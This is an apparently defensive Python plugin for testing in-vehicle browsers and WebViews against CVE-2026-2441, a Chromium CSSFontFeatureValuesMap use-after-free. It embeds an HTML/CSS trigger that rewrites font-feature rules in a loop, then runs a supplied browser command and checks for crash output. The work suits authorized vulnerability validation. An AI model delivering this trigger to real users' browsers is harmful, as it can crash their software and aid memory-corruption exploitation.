#!/usr/bin/env python3
"""Active validation for Chromium CSSFontFeatureValuesMap UAF risk."""
from __future__ import annotations

import os
import shlex
import subprocess
import tempfile

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": "POC-LAB-007",
    "cve": "CVE-2026-2441",
    "year": 2026,
    "domain": "IVI浏览器/WebView",
    "vendor_product": "Chrome / Chromium-based browsers",
    "component": "Blink CSSFontFeatureValuesMap",
    "type": "Use-After-Free/RCE",
    "summary": "Chromium Blink CSSFontFeatureValuesMap 迭代器 UAF 可由恶意 HTML 触发，车机浏览器、WebView、投屏浏览组件和 Android Automotive 环境需排查。",
    "source_description": "poc-lab describes a CSSFontFeatureValuesMap iterator use-after-free affecting Chrome/Chromium before fixed versions.",
    "poc_status": "poc-lab公开复现；本插件支持主动验证；破坏性 payload 需 allow_disruptive 授权",
    "research_value": "车机 WebView/浏览器是 IVI 常见攻击面，Chromium 版本滞后会放大远程内容风险。",
    "source_url": "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-2441%20Chrome%20CSSFontFeatureValuesMap%20UAF",
    "references": ["https://github.com/Unclecheng-li/poc-lab"],
    "affected": [
        {"vendor": "Google", "product": "Chrome", "versions": [{"version": "0", "status": "affected", "lessThan": "145.0.7632.75"}]},
        {"vendor": "Chromium", "product": "Chromium", "versions": [{"version": "0", "status": "affected", "lessThan": "145.0.7632.75"}]},
    ],
    "signature_tokens": [
        "CVE-2026-2441", "Chrome", "Chromium", "Blink", "CSSFontFeatureValuesMap",
        "WebView", "Android System WebView", "145.0.7632.75", "UAF",
        "Use After Free",
    ],
}


def _write_chromium_uaf_html() -> str:
    fd, path = tempfile.mkstemp(prefix="autosec_cve_2026_2441_", suffix=".html")
    html = """<!doctype html>
<meta charset="utf-8">
<style>@font-feature-values AutoSec { @styleset { nice: 1; } }</style>
<script>
let style = document.querySelector('style');
for (let i = 0; i < 5000; i++) {
  document.body.appendChild(document.createElement('div')).style.fontFamily = 'AutoSec';
  style.textContent = `@font-feature-values AutoSec${i} { @styleset { nice: ${i}; } }`;
}
document.title = 'autosec-cssfontfeaturevaluesmap-uaf-stimulus';
</script>
"""
    with os.fdopen(fd, "w", encoding="utf-8") as handle:
        handle.write(html)
    return path


def _chromium_probe(plugin, vuln):
    supplied_sample = plugin.params.get("html_sample_path") or plugin.params.get("sample_path")
    sample = str(supplied_sample) if supplied_sample else _write_chromium_uaf_html()
    cmd = plugin.params.get("browser_cmd") or plugin.params.get("chromium_cmd")
    evidence = {
        "ok": True,
        "sample_path": sample,
        "payload_bytes": os.path.getsize(sample),
        "sample_source": "operator_supplied" if supplied_sample else "generated_stimulus",
        "phenomenon": "malicious HTML/CSS stimulus generated for Chromium/WebView crash observation",
        "requires_manual_review": True,
    }
    if not cmd:
        evidence["operator_action"] = "Open sample_path in an instrumented IVI browser/WebView or pass chromium_cmd/browser_cmd in a lab."
        return evidence
    started = subprocess.run(
        shlex.split(str(cmd)) + [sample],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=float(plugin.params.get("timeout", 15)),
        check=False,
    )
    stderr = started.stderr.decode("utf-8", errors="replace")
    evidence.update({
        "command": cmd,
        "returncode": started.returncode,
        "stderr_excerpt": stderr[:1000],
        "vulnerable": started.returncode < 0 or any(token in stderr.lower() for token in ("crash", "asan", "heap", "use-after-free", "segmentation fault")),
        "phenomenon": "browser/WebView process executed against generated HTML stimulus",
    })
    return evidence


class ChromiumCSSFontFeatureValuesMapUAFAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-APP-065"
    meta_poc_name = "Chromium CSSFontFeatureValuesMap UAF Active Validation"
    meta_cve_id = "CVE-2026-2441"
    meta_severity = "High"
    meta_protocol = "local"
    meta_target_os = ["android", "linux", "all"]
    meta_required_params = ["software_inventory_text"]
    meta_profiles = ["application", "browser", "webview"]
    meta_source_url = VULN["source_url"]
    meta_attack_surface = "IVI浏览器/WebView"
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_chromium_probe)
